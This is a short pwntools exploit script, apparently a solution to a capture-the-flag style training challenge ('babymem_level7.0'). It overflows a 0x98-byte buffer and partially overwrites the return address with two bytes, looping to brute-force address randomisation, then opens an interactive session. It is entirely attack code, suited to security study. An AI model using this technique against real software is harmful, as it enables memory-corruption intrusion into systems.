from pwn import *

while(1):
    # Init
    elf = ELF("/challenge/babymem_level7.0")

    buffer_length = int("98", 16)

    io = elf.process()

    # Payload
    payload = b"A"*buffer_length + b"\xfc\x18"

    # Interaction
    io.recvuntil("size:")
    io.sendline(str(buffer_length + 2))

    io.recvuntil("bytes)!")
    io.sendline(payload)

    io.interactive()